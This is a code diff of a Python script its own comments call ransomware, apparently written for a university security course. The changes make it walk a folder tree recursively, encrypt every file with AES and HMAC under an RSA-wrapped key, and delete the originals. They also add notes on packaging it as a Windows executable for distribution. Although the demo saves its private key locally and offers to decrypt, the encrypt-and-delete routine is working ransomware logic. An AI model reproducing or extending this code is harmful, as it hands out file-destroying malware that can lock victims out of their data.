@@ -17,7 +17,8 @@ import binascii
 from os import listdir
 from os.path import isfile, join
 from colorama import Fore, Style, init
-#import py2exe # to create windows executable
+
+# run pyinstaller ransomware.py to build exe
 
 init()
 
@@ -105,7 +106,7 @@ def MydecryptMAC(c, iv, tag, encKey, HMACKey):
     # Return message
         return message
 
-######### ------------------------------------------------------------ RANSOMWARE MODULES ------------------------------------------------------------------------ #########
+####### ---------------------------------------------------- RANSOMWARE MODULES ------------------------------------------------------------- #########
 
 def MyfileEncryptMAC(filepath):
     # Open file as bytes
@@ -162,7 +163,7 @@ def MyfileEncryptMAC(filepath):
 # This function module is not needed anymore
 def MyfileDecryptMAC():
     # Open and Decodes JSON file
-    with open('C://Users//Kurt Tito//Desktop//CECS-378//PythonEncryptDecrypt//TestFolder//HMACdata.json', 'r') as f:
+    with open('hmac//HMACdata.json', 'r') as f:
         data = json.load(f)
 
     # In bytes
@@ -189,7 +190,7 @@ def MyfileDecryptMAC():
     print(originalfile_bytes)
 
     # Save file
-    savefilePath = "C://Users//Kurt Tito//Desktop//CECS-378//PythonEncryptDecrypt//TestFolder//MAC_FileEncrypt_output"
+    savefilePath = "hmac//MAC_FileEncrypt_output"
     savefilePath += str(ext)
 
     f = open(savefilePath, "wb")
@@ -199,7 +200,7 @@ def MyfileDecryptMAC():
 def MydecryptMAC():
 
     # Open and read rsa_data
-    with open('C://Users//Kurt Tito//Desktop//CECS-378//PythonEncryptDecrypt//TestFolder//rsa_data.json', 'r') as f:
+    with open('hmac//rsa_data.json', 'r') as f:
         rsa_data = json.load(f)
 
     # Open, read, and store private key as var
@@ -237,7 +238,7 @@ def MydecryptMAC():
     print(originalfile_bytes)
 
     # Save file
-    savefilePath = "C://Users//Kurt Tito//Desktop//CECS-378//PythonEncryptDecrypt//TestFolder//NSA_Highly_Classified"
+    savefilePath = "hmac//NSA_Highly_Classified"
     savefilePath += str(ext)
 
     f = open(savefilePath, "wb")
@@ -295,25 +296,24 @@ def MyRSAEncryptMAC(filepath, RSA_PublicKey_filepath, fileNumber):
     'iv': iv_string,
     'tag': tag_string,
     'ext': ext_string
-
     }
 
     # Get parent directory of filepath
     parent = os.path.abspath(os.path.join(filepath, os.pardir))
 
     # Write JSON data to rsa_data.encrypted file
-    with open(parent + '\HMAC_rsa_data'+ str(fileNumber) + '.encrypted', 'w+') as f:
+    with open(parent + '\hmac_rsa_data_'+ str(bin(fileNumber)) + '.encrypted', 'w+') as f:
         json.dump(data, f)
 
     os.remove(filepath)
     print(Fore.LIGHTGREEN_EX + "Encrypting " + filepath)
-    #print(RSACipher, c, iv, tag, ext)
+    #print(RSACipher, c, iv, tag)
     return RSACipher, c, iv, tag, ext
 
 def MyRSADecryptMAC(filepath, RSA_PrivateKey_filepath, fileNumber):
 
     # Open and read rsa_data
-    with open(filepath + '\HMAC_rsa_data' + str(fileNumber) + '.encrypted', 'r') as z:
+    with open(filepath, 'r') as z:
         rsa_data = json.load(z)
 
     # Open, read, and store private key as var
@@ -359,18 +359,18 @@ def MyRSADecryptMAC(filepath, RSA_PrivateKey_filepath, fileNumber):
     originalfile_bytes = data + unpadder.finalize()
 
     # Print original files data in bytes
-    print(Fore.LIGHTGREEN_EX + "Decrypting" + filepath + '\HMAC_rsa_data' + str(fileNumber) + '.encrypted')
+    print(Fore.LIGHTGREEN_EX + "Decrypting" + filepath)
     #print(originalfile_bytes)
 
     # Create filepath and add proper file type extension
-    encFilePath = filepath + "\RSA_output_MAC" + str(fileNumber)
+    encFilePath = filepath.strip('.encrypted')
     encFilePath += str(ext)
 
     # Open filepath, if not already exist, then create one and write the original files data (in bytes) onto it
     f = open(encFilePath, "wb")
     f.write(bytearray(originalfile_bytes))
     f.close()
-    os.remove(filepath + '\HMAC_rsa_data'+ str(fileNumber) +'.encrypted')
+    os.remove(filepath)
 
 def main():
 
@@ -379,13 +379,15 @@ def main():
 
     # Create and write public key to pem file
     public_key = new_key.publickey().exportKey("PEM")
-    f = open('keys//rsa_public_key.pem', 'wb')
+    pub_key_filename = os.path.join('keys//rsa_public_key.pem') # FIX THIS FOR EXE DISTRIBUTABLE
+    f = open(pub_key_filename, 'wb')
     f.write(public_key)
     f.close()
 
     # Create and write private key to pem file
     private_key = new_key.exportKey("PEM")
-    f = open('keys//rsa_private_key.pem', 'wb')
+    pri_key_filename = os.path.join('keys//rsa_private_key.pem') # FIX THIS FOR EXE DISTRIBUTABLE
+    f = open(pri_key_filename, 'wb')
     f.write(private_key)
     f.close()
 
@@ -398,14 +400,11 @@ def main():
     RSA_PublicKey_filepath = 'keys//rsa_public_key.pem'
     RSA_PrivateKey_filepath = 'keys//rsa_private_key.pem'
 
-    # Compile a list of filenames in the folder
-    listOfFileNames = [f for f in listdir(mypath) if isfile(join(mypath, f))]
-
-    # For each file, we're going to encrypt it using rsa encrypt
     counter = 0
-    for i in listOfFileNames:
-        MyRSAEncryptMAC(mypath + '\\' + i, RSA_PublicKey_filepath, counter)
-        counter += 1
+    for root, dirs, files in os.walk(mypath, topdown=True):
+        for name in files:
+            MyRSAEncryptMAC(os.path.join(root, name), RSA_PublicKey_filepath, counter)
+            counter += 1
 
     checker = True
 
@@ -415,9 +414,12 @@ def main():
         confirm = confirm.upper()
         if confirm == 'Y':
             counter = 0
-            for i in listOfFileNames:
-                MyRSADecryptMAC(mypath, RSA_PrivateKey_filepath, counter)
-                counter += 1
+
+            for root, dirs, files in os.walk(mypath, topdown=True):
+                for name in files:
+                    MyRSADecryptMAC(os.path.join(root, name), RSA_PrivateKey_filepath, counter)
+                    counter += 1
+
             checker = False
         elif confirm == "N":
             print("Exiting Program...")
